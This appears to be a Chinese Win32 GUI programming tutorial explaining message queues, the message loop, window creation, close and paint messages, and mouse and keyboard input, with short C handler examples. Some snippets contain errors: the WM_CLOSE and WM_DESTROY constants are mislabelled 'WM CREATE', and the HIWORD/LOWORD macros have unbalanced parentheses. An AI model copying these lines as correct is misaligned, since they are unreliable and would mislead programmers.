<h5 id="PostThreadMessage"><a href="#PostThreadMessage" class="headerlink" title="PostThreadMessage"></a>PostThreadMessage</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PostThreadMessageA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD  idThread,</span></span></span><br><span class="line"><span class="params"><span class="function">  UINT   Msg,</span></span></span><br><span class="line"><span class="params"><span class="function">  WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>将消息发布到指定线程（可以是不同线程）的消息队列，直接返回而无需等待线程处理消息。</p>
<p><img src="/win32/Win32%20GUI/image-20210205175201185.png" alt="image-20210205175201185"></p>
<h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p><code>Windows</code> 中有一个系统消息队列，以及分别为每个 <code>GUI</code> 线程维护一个各自的线程消息队列（应用程序消息队列）。为了避免非 <code>GUI</code> 线程创建线程消息队列的开销，所有线程创建初始化时，均不创建消息队列。只有当线程第一次调用 <code>GDI</code> 函数（画图函数，即创建界面，位于 <code>User32.dll</code> 和 <code>GDI32.dll</code> 中）时， 系统才会为线程创建消息队列，所以那些非 <code>GUl</code> 线程是没有消息队列的。</p>
<img src="/win32/Win32%20GUI/image-20210205172035983.png" alt="image-20210205172035983" style="zoom: 50%;" align="left">



<p><strong>线程与消息队列</strong></p>
<p>在一个线程中可以产生多个窗口，每个窗口可共用一个线程消息队列，所以某个窗口产生的消息，都是先由创建这个窗口的线程处理的。窗口在任何线程中都可以创建，但消息循环必须要和创建窗口在同一线程，否则窗口将无法从 <code>DispatchMessage</code> 函数中获取任何消息。</p>
<img src="/win32/Win32%20GUI/image-20210205172446181.png" alt="image-20210205172446181" style="zoom:50%;" align="left">





<h3 id="消息循环"><a href="#消息循环" class="headerlink" title="消息循环"></a>消息循环</h3><p><code>UI</code> 线程启动一个消息循环，每次从本线程所对应的消息队列中取出一条消息，然后根据消息所包容的信息，将其转发给特定的窗体对象，此窗体对象所对应的窗体过程（消息处理函数）被调用以处理这些消息。</p>
<img src="/win32/Win32%20GUI/image-20210205163708885.png" alt="image-20210205163708885" style="zoom:80%;" align="left">



<p><strong>消息循环的结束</strong></p>
<p>当实现程序结束时，应用程序可以调用 <code>PostQuitMessage</code> 函数发送 <code>WM_ QUIT</code> 消息，结束消息循环。<code>PostQuitMessage</code> 函数投递一 个 <code>WM_ QUIT</code> 消息到线程消息队列并且立即返回，以结束消息循环，并终结程序 <code>WM_CLOSE</code>。该函数简通常用来响应 <code>WM_ DESTROY</code> 消息。</p>
<p><img src="/win32/Win32%20GUI/image-20210205171324188.png" alt="image-20210205171324188"></p>
<h3 id="窗口过程"><a href="#窗口过程" class="headerlink" title="窗口过程"></a>窗口过程</h3><p>每个窗口都有窗口过程来处理窗口接收到的消息。窗口过程是一个回调函数， 它是由 <code>Windows</code> 自动调用的。</p>
<h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><h4 id="WM-NCCREATE"><a href="#WM-NCCREATE" class="headerlink" title="WM_NCCREATE"></a>WM_NCCREATE</h4><p>使用 <code>CreateWindow</code> 函数创建窗口时，<code>CreateWindow</code> 先直接发送 <code>WM_NCCREATE</code> 消息（先于 <code>WM_CREATE</code> 消息）给窗口过程函数，NC，即 <code>non-client</code> 区域，包括标题栏、窗口边框、最大、最小按钮、滚动条等。如果应用程序处理此消息，则应该返回 <code>TRUE</code> 以继续创建窗口，如果应用程序返回<code>FALSE</code> ，则 <code>CreateWindow</code> 或 <code>CreateWindowEx</code> 函数将返回 <code>NULL</code> 句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_NCCREATE	0x0081</span></span><br></pre></td></tr></table></figure>

<p>注：<code>wParam</code> 未使用；<code>lParam</code>  为指向 <code>CREATESTRUCT</code> 结构的指针，其中包含有关正在创建的窗口的信息。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NCCREATE:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nccreate...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">    <span class="comment">//CREATESTRUCT* pCreateStruct = (CREATESTRUCT*)lParam;</span></span><br><span class="line">    <span class="comment">//return TRUE;		</span></span><br><span class="line">    <span class="comment">/* 自己处理后, WindowsText 存在问题 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，<code>WM_NCCREATE</code> 的消息处理确实是优先于 <code>WM_CREATE</code> 。</p>
<img src="/win32/Win32%20GUI/image-20210206160539492.png" alt="image-20210206160539492" style="zoom:80%;" align="left">



<h4 id="WM-CREATE"><a href="#WM-CREATE" class="headerlink" title="WM_CREATE"></a>WM_CREATE</h4><p>发送完 <code>WM_ NCCREATE</code> 后，<code>CreateWindow</code> 函数在窗口创建成功并且在返回之前发送 <code>WM_CREATE</code> 消息给窗口过程函数，窗口过程函数会在创建窗口后但在窗口变为可见之前接收到此消息（可以在此时机初始化滚动条，创建子窗口、控件等等)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM CREATE 0x0001</span></span><br></pre></td></tr></table></figure>



<p>注：<code>wParam</code> 未使用；<code>lParam</code> 为指向 <code>CREATESTRUCT</code> 结构的指针，其中包含有关正在创建的窗口的信息。</p>
<h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><p>窗口关闭流程如下：</p>
<img src="/win32/Win32%20GUI/image-20210206160952767.png" alt="image-20210206160952767" align="left">



<img src="/win32/Win32%20GUI/image-20210206165504126.png" alt="image-20210206165504126" style="zoom:80%;" align="left">



<h4 id="WM-CLOSE"><a href="#WM-CLOSE" class="headerlink" title="WM_CLOSE"></a>WM_CLOSE</h4><p>当我们点击窗口的关闭按钮时，会产生 <code>WM_CLOSE</code> 消息，而操作系统接收此消息，操作系统通过调用 <code>DestroyWindow</code> 和 <code>PostQuitMessage</code> 函数实现关闭并销毁窗口，结束消息循环。 （<code>WM_CLOSE</code> 的作用就是将窗口从屏幕上移除，使其不可见）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM CREATE 0x0010</span></span><br></pre></td></tr></table></figure>



<p><code>DestroyWindow</code> 函数：销毁指定的窗口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DestroyWindow</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hWnd<span class="comment">//要销毁的窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>该函数将 <code>WM_ DESTROY</code> 和 <code>WM_ NCDESTROY</code> 消息发送到窗口以停用它并从中移除键盘焦点。该功能还销毁窗口的菜单，刷新线程消息队列，破坏定时器，删除剪贴板所有权，并打破剪贴板查看器链(如果窗口位于查看器链的顶部)。如果指定的窗口是父窗口或所有者窗口，则 <code>DestroyWindow</code> 会在销毁父窗口或所有者窗口时自动销毁关联的子窗口或拥有的窗口。该函数首先销毁子窗口或拥有的窗口，然后销毁父窗口或所有者窗口。<code>DestroyWindow</code> 也破坏 <code>CreateDialog</code> 函数创建的无模式对话框。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;close windows...\n&quot;</span>);</span><br><span class="line">    DestroyWindow(hwnd);</span><br><span class="line">    <span class="comment">// return DefWindowProc(hwnd, uMsg, wParam, lParam);	// 有效</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：该消息可直接返回给 <code>DefWindowProc </code> 处理；若是手动处理，必须手动调用 <code>DestroyWindow</code> 函数，以实现关闭窗口，否则窗口将无法关闭！</strong></p>
<h4 id="WM-DESTROY"><a href="#WM-DESTROY" class="headerlink" title="WM_DESTROY"></a>WM_DESTROY</h4><p>窗口从屏幕上移除后，<code>WM_DESTROY</code> 被发送到正在销毁的窗口的窗口过程。如果一个应用程序处理这个消息，它应该返回零。此时可用于释放与窗口关联的已分配内存对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM CREATE 0x0002</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">&#123;</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;destroy windows...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// return DefWindowProc(hwnd, uMsg, wParam, lParam);	// 无效</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：<code>WM_DESTROY</code> 消息必须手动处理，而且必须手动调用 <code>PostQuitMessage</code> 以结束消息循环，将消息返回给 <code>DefWindowProc</code>  无效。</strong></p>
<h4 id="WM-NCDESTROY"><a href="#WM-NCDESTROY" class="headerlink" title="WM_NCDESTROY"></a>WM_NCDESTROY</h4><p>通知窗口其非客户区域（边框、系统菜单栏）正在销毁。如果一个应用程序处理这个消息，它应该返回零。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NCDESTROY:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ncdestroy windows...\n&quot;</span>);</span><br><span class="line">    <span class="comment">//return DefWindowProc(hwnd, uMsg, wParam, lParam);		// 有效</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：<code>WM_NCDESTROY</code> 消息，无需手动处理，可直接返回给 <code>DefWindowProc</code> 处理。该消息无需做任何处理，也可直接返回。</strong></p>
<h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><h4 id="WM-PAINT"><a href="#WM-PAINT" class="headerlink" title="WM_PAINT"></a>WM_PAINT</h4><p><code>WM_PAINT</code> 消息的触发时机：</p>
<ol>
<li>程序启动时，<code>UpdateWindow</code> 函数发送一个 <code>WM_PAINT</code> 消息来更新指定窗口的客户区。</li>
<li>用鼠标调整窗口的大小，时会连续触发。</li>
<li>最小化时不会触发 <code>WM_ PAINT</code> 消息，但是从最小化还原时会进行触发。</li>
<li>最大化时会触发 <code>WM_PAINT</code> 消息。</li>
<li>当向屏幕外拖动窗口时，不会触发 <code>WM_PAINT</code> 消息，但是拉回到屏幕内时会不断的触发 <code>WM_ PAINT</code> 消息。</li>
<li>使用 <code>InvalidateRect</code> 函数时会触发 <code>WM_PAINT</code> 消息。</li>
<li>移动或者覆盖窗口，不会产生 <code>WM_PAINT</code> 消息 ，因为窗口的客户区大小并未改变!</li>
</ol>
<p><strong><code>WM_PAINT</code> 消息的处理</strong></p>
<p>如果应用程序在窗口过程中用如下方法处理 <code>WM_ PAINT</code> 消息，那么将导致不停的发送消息！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM PAINT:</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/win32/Win32%20GUI/image-20210206171841196.png" alt="image-20210206171841196" style="zoom: 80%;" align="left">



<p>如果当前窗口用户区的某一部分变为无效，则 <code>Windows</code> 会将一 个 <code>WM_PAINT</code> 消息放到消息队列中，如果不调用 <code>BeginPaint</code> 和<code>EndPaint</code> 函数处理，(同时也不调用 <code>ValidateRect</code> 函数)，则该无效区域不会变为有效，于是 <code>Windows</code> 将会持续发送 <code>WM_PAINT</code> 消息，直到消息被处理（使用户区域有效化）。默认消息处理函数 <code>DefWindowProc</code> 可以处理 <code>WM_PAINT</code> 消息。</p>
<img src="/win32/Win32%20GUI/image-20210206172037981.png" alt="image-20210206172037981" style="zoom:80%;" align="left">



<p>当我们移动、操作窗口时，就会产生 <code>WM_PAINT</code> 消息。</p>
<p><strong>窗口有效化</strong></p>
<p>我们可以使用 <code>BeginPaint</code> 函数，使得窗口有效化，此时 <code>windows</code> 将不会重复发送 <code>WM_PAINT</code> 消息，直到窗口因改变大小或移动而造成窗口再次无效化为止。（当窗口无效化时，将会一直产生 <code>WM_PAINT</code> 消息。）</p>
<p>需要注意的是，当使用 <code>BeginPaint</code> 函数时，必须调用 <code>EndPaint</code> 函数结束窗口有效化。</p>
<p><strong>PAINTSTRUCT结构</strong></p>
<p>每个窗口都有一个 <code>PAINTSTRUCT</code> 结构来记录一些绘制信息，<code>PAINTSTRUCT</code> 结构保存了应用程序拥有的窗口的客户区域的属性。</p>
<img src="/win32/Win32%20GUI/image-20210206173636661.png" alt="image-20210206173636661" style="zoom: 50%;" align="left">



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">&#123;</span><br><span class="line">    PAINTSTRUCT ps;</span><br><span class="line">    HDC hdc = BeginPaint(hwnd, &amp;ps);	<span class="comment">// 使无效区域有效化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> UINT i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;print windows %d\n&quot;</span>, i++);</span><br><span class="line">    EndPaint(hwnd, &amp;ps);</span><br><span class="line">    <span class="comment">// return DefWindowProc(hwnd, uMsg, wParam, lParam);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，当调用 <code>BeginPaint()</code> 函数使得窗口有效化时，只产生了一个 <code>WM_PAINT</code> 消息，而系统消处理函数效果相同。</p>
<img src="/win32/Win32%20GUI/image-20210206173931232.png" alt="image-20210206173931232" style="zoom:80%;" align="left">



<h4 id="WM-NCPAINT"><a href="#WM-NCPAINT" class="headerlink" title="WM_NCPAINT"></a>WM_NCPAINT</h4><p>当窗口客户区以外的部分（如窗口标题栏、菜单栏等）需要重新绘制时，系统向程序发出 <code>WM_NCPAINT</code> 消息。因标准窗口的客户区以外部分为窗口必需部分，因而该消息将默认被发送到 <code>DefWindowProc</code> 函数进行默认处理。我们可通过截获该消息来实现窗口框架自定义绘制。<code>wParam</code> ，即窗口更新区域的句柄，更新区域被剪裁到窗口框架中；<code>lParam</code> 参数未使用。</p>
<img src="/win32/Win32%20GUI/image-20210206185002796.png" alt="image-20210206185002796" style="zoom:80%;" align="left">



<p>当对该消息不做任何处理直接返回时，标题栏没有任何显示。当我们对该消息进行处理时，接可以实现自定义标题栏。</p>
<p><img src="/win32/Win32%20GUI/image-20210206185853437.png" alt="image-20210206185853437"></p>
<p><strong>自定义标题栏</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NCPAINT:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ncprint...\n&quot;</span>);</span><br><span class="line">    HDC  hdc = GetWindowDC(hwnd);</span><br><span class="line">    RECT  r;</span><br><span class="line">    r.left = <span class="number">0</span>;</span><br><span class="line">    r.top = <span class="number">0</span>;</span><br><span class="line">    r.right = <span class="number">300</span>;</span><br><span class="line">    r.bottom = <span class="number">30</span>;</span><br><span class="line">    HBRUSH  brh = CreateSolidBrush(RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    FillRect(hdc, &amp;r, brh);</span><br><span class="line">    SetBkMode(hdc, TRANSPARENT);</span><br><span class="line">    TextOutA(hdc, <span class="number">5</span>, <span class="number">5</span>, <span class="string">&quot;自定义窗口标题&quot;</span>, <span class="number">14</span>);<span class="comment">//最后一个参数为字符串长度</span></span><br><span class="line">    DeleteObject(brh);</span><br><span class="line">    ReleaseDC(hwnd, hdc);</span><br><span class="line">    <span class="keyword">return</span>  TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/win32/Win32%20GUI/image-20210206190401384.png" alt="image-20210206190401384"></p>
<h4 id="WM-ERASEBKGND"><a href="#WM-ERASEBKGND" class="headerlink" title="WM_ERASEBKGND"></a>WM_ERASEBKGND</h4><p>当窗口的移动，窗口的大小的改变时，必须在擦除窗口背景时发送 <code>WM_ERASEBKGND</code> 消息，以准备用于重新绘制无效部分的窗口。<code>Windows</code> 会给窗口先发出一次或者几次的 <code>WM_ERASEBKGND</code> 消息，紧接着是 <code>WM_PAINT</code> 消息。 </p>
<p>当窗口无效时，<code>DefWindowProc</code> 函数默认通过使用 <code>WNDCLASS</code> 结构中指定的 <code>hbrBackground</code> 背景画笔擦除背景。如果 <code>hbrBackground</code> 为 <code>NULL</code> ，则应用程序应处理 <code>WM_ERASEBKGND</code> 消息并清除背景。</p>
<p>如果应用程序处理消息并擦除背景，应用程序应返回非零值以响应 <code>WM_ERASEBKGND</code> ，这表明不需要进一步擦除。如果应用程序返回零，窗口将保持标记为需要擦除（通常，这表示 <code>BeginPaint</code> 中获取的 <code>PAINTSTRUCT</code> 结构的 <code>fErase</code> 成员将为 <code>TRUE</code>）。</p>
<p>其中，<code>wParam</code> 表示设备上下文句柄，<code>IParam</code> 未使用。</p>
<p><img src="/win32/Win32%20GUI/image-20210206181346479.png" alt="image-20210206181346479"></p>
<p><strong>更新窗口客户区</strong></p>
<p><code>UpdateWindow</code> ：</p>
<p><code>InvalidateRect</code> ：添加一个矩形到指定窗口的更新区域(必须重绘的窗口客户区域部分)。</p>
<p><code>RedrawWindow</code> ：更新窗口的客户区指定的矩形或区域。</p>
<img src="/win32/Win32%20GUI/image-20210206182549077.png" alt="image-20210206182549077" style="zoom: 67%;" align="left">



<p><em><strong>为什么操作系统在应用消息队列为空时才发送 <code>WM_PAINT</code> 消息呢?</strong></em></p>
<p>这是因为系统把在窗口中的绘制操作当作一种低优先级的操作，于是尽可能地推后做。不过这样也有利于提高绘制的效率：两个 <code>WM_PAINT</code> 消息之间通过 <code>InvalidateRect</code> 和 <code>InvaliateRgn</code> 使之失效的区域就会被累加起来，然后在一个 <code>WM_PAINT</code> 消息中一次得到更新，不仅能避免多次重复地更新同一区域，也优化了应用的更新操作。像这种通过 <code>InvalidateRect</code> 和 <code>InvalidateRgn</code> 来使窗口区域无效，依赖于系统。</p>
<p>在合适的时机发送 <code>WM_PAINT</code> 消息的机制实际上是一种异步工作方式，也就是说，在无效化窗口区域和发送 <code>WM_PAINT</code> 消息之间是有延迟的。有时候这种延迟并不是我们希望的，可以使用 <code>Windows GDI</code> 为我们提供的更方便和强大的函数：<code>UpdateWindow</code> 和 <code>RedrawWindow</code>。<code>UpdateWindow</code> 会检查窗口的 <code>Update Region</code>，当其不为空时才发送 <code>WM_PAINT</code> 消息;。<code>RedrawWindow</code> 则给我们更多的控制：是否重画非客户区和背景，是否总是发送 <code>WM_PAINT</code> 消息而不管 <code>Update Region</code> 是否为空等。</p>
<h3 id="鼠标"><a href="#鼠标" class="headerlink" title="鼠标"></a>鼠标</h3><p><strong>鼠标相关消息</strong></p>
<table>
<thead>
<tr>
<th>消息类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>WM_LBUTTONDOWN</td>
<td>鼠标左键按下</td>
</tr>
<tr>
<td>WM_LBUTTONUP</td>
<td>鼠标左键抬起</td>
</tr>
<tr>
<td>WM_RBUTTONDOWN</td>
<td>鼠标右键按下</td>
</tr>
<tr>
<td>WM_RBUTTONUP</td>
<td>鼠标右键抬起</td>
</tr>
<tr>
<td>WM_MOUSEMOVE</td>
<td>鼠标移动消息</td>
</tr>
<tr>
<td>WM_LBUTTONDBLCLK</td>
<td>鼠标左键双击</td>
</tr>
<tr>
<td>WM_RBUTTONDBLCLK</td>
<td>鼠标右键双击</td>
</tr>
<tr>
<td>WM_MOUSEWHEEL</td>
<td>鼠标滚轮消息</td>
</tr>
</tbody></table>
<p>注：鼠标消息携带的参数：</p>
<ul>
<li><code>WMPARAM</code> ：其他按键的状态， 例如CtrI/Shift等。</li>
<li><code>LPARAM</code> ：鼠标的位置，窗口客户区的坐标系。<ul>
<li><code>LOWORD(LPARAM)</code> ：X坐标位置</li>
<li><code>HIWORD(LPARAM)</code> ：Y坐标位置</li>
</ul>
</li>
</ul>
<p><code>HIWORD</code> 宏-一般用来取得 <code>LPARAM</code> 的高位（高16位），<code>LOWORD</code> 返回值是指定值的低16位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIWORD(I)	((WORD(((DWORD)(I)&gt;&gt; 16)&amp; 0xFFFF))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOWORD(I)	((WORD)((DWORD_PTR)(I)) &amp; 0xFFFF))</span></span><br></pre></td></tr></table></figure>



<h3 id="键盘"><a href="#键盘" class="headerlink" title="键盘"></a>键盘</h3><p><strong>键盘相关消息</strong></p>
<table>
<thead>
<tr>
<th>消息类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>WM_SYSKEYDOWN</td>
<td>系统按键消息，与 <code>ALT</code> 键相组合的组合键</td>
</tr>
<tr>
<td>WM_SYSKEYUP</td>
<td>系统按键消息，与 <code>ALT</code> 键相组合的组合键</td>
</tr>
<tr>
<td>WM_SYSCHAR</td>
<td>系统按键消息，与 <code>ALT</code> 键相组合的组合键</td>
</tr>
<tr>
<td>WM_KEYDOWN</td>
<td>非系统按键消息，键盘按下</td>
</tr>
<tr>
<td>WM_KEYUP</td>
<td>非系统按键消息，键盘弹起</td>
</tr>
<tr>
<td>WM_CHAR</td>
<td>非系统按键消息，键盘字符消息</td>
</tr>
</tbody></table>
<p>需要注意的是：</p>
<ul>
<li>除 <code>Print</code> 键之外都有按下消息</li>
<li>所有键都存在弹起消息</li>
<li>产生字符消息的按键：任何字符键、回退键( <code>BACKSPACE</code>)、回车键、<code>ESC</code>、<code>SHIFT+ENTER</code> (linefeed 换行)、<code>TAB</code></li>
</ul>
<p>键盘驱动程序为每个实体键对应都有一个统一的虚拟键，Windows定义的虚拟键都定义在 <code>WinUser.h</code> 头文件中，都是以 <code>VK</code> 作为前缀。如：回车键的虚拟键是 <code>VK_RETURN</code> ， 数字键是 <code>VK_0 - VK_9</code>。</p>
<p><em><strong>我们是怎么收到 <code>WM_CHAR</code> 的呢?</strong></em></p>
<p>就是因为我们在消息循环时调用了 <code>TranslateMessage</code> 函数对键盘消息进行翻译，如果消息为 <code>WM_KEYDOWN</code> 或者 <code>WM_ SYSKEYDOWN</code> ，并且按键与位移状态相组合产生一个字符， 则 <code>TranslateMessage</code> 把字符消息放入消息队列中。此字符消息将是 <code>GetMessage</code> 从消息队列中得到的按键消息之后的下一个消息。</p>
<p>在我们处理这个消息时，对应的 <code>wParam</code> 不是虚拟键，而是 <code>ANSI</code> 或 <code>Unicode</code> 字符代码。一般情况下我们可以这样用： <code>(TCHAR)wParam</code> 。 因为 <code>TranslateMessage</code> 函数从 <code>WM_KEYDOWN</code> 和 <code>WM_SYSKEYDOWN</code> 消息产生了字符消息，所以字符消息是夹在按键<br>消息之间传递给窗口消息处理程序的。</p>
<p>例如，如果 <code>CapsLock</code> 未打开，而使用者按下再释放 <code>A</code> 键，则窗口消息处理程序按顺序将收到如下的三个消息:</p>
<img src="/win32/Win32%20GUI/image-20210207124251700.png" alt="image-20210207124251700" style="zoom: 67%;" align="left">



<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wm_keydown: %x %c\n&quot;</span>, wParam, wParam);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_KEYUP:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wm_keyup: %x %c\n&quot;</span>, wParam, wParam);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;char: %x %c\n&quot;</span>, wParam, wParam);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210207130743862.png" alt="image-20210207130743862" style="zoom:80%;" align="left">



<h2 id="资源文件"><a href="#资源文件" class="headerlink" title="资源文件"></a>资源文件</h2><p><code>Windows</code> 应用程序中，图标、菜单、位图、工具条、对话框等是以资源的形式存在的。在 <code>win32</code> 编程中，为方便项目中的资源统一管理， 提供了一个格式统一的资源文件，对各种资源进行管理。资源文件的扩展名是 <code>.rc</code> ，它必须有 <code>resource.h</code> 的头文件来辅助，在程序编译时它会被资源编译器（<code>re.exe</code>）编译生成一个 <code>.res</code> 的二进制文件。</p>
<p>在资源文件中，所有的资源都有一个资源 <code>ID</code> ，实际上是一个常数，用于标识资源文件，其定义在 <code>resourse.h</code> 文件头中。</p>
<h3 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h3><p>我们可以在【资源视图】中创建资源文件，如下图所示：</p>
<img src="/win32/Win32%20GUI/image-20210207154934554.png" alt="image-20210207154934554" style="zoom:80%;" align="left">



<p>在创建完资源文件后，可以看到，文件中产生了 <code>resourse.h</code> 头文件和 <code>.rc</code> 文件。</p>
<img src="/win32/Win32%20GUI/image-20210207155316435.png" alt="image-20210207155316435" style="zoom:80%;" align="left">



<p>在创建了一个对话框后，发现 <code>resourse.h</code> 文件中出现了资源对应的 <code>ID</code> ，程序编译后生成了 <code>.res</code> 文件。</p>
<img src="/win32/Win32%20GUI/image-20210207155900652.png" alt="image-20210207155900652" style="zoom:80%;" align="left">



<img src="/win32/Win32%20GUI/image-20210207155944034.png" alt="image-20210207155944034" style="zoom:80%;" align="left">



<img src="/win32/Win32%20GUI/image-20210207160328113.png" alt="image-20210207160328113" style="zoom:80%;" align="left">



<h3 id="加载资源"><a href="#加载资源" class="headerlink" title="加载资源"></a>加载资源</h3><p><code>Windows</code> 提供了相应的 <code>API</code> 加载图标、菜单、位图、工具条、字符串等资源。</p>
<p><strong>常用API</strong></p>
<table>
<thead>
<tr>
<th>API</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>LoadImage</td>
<td>加载图像资源（可加载位图、游标、图标）</td>
</tr>
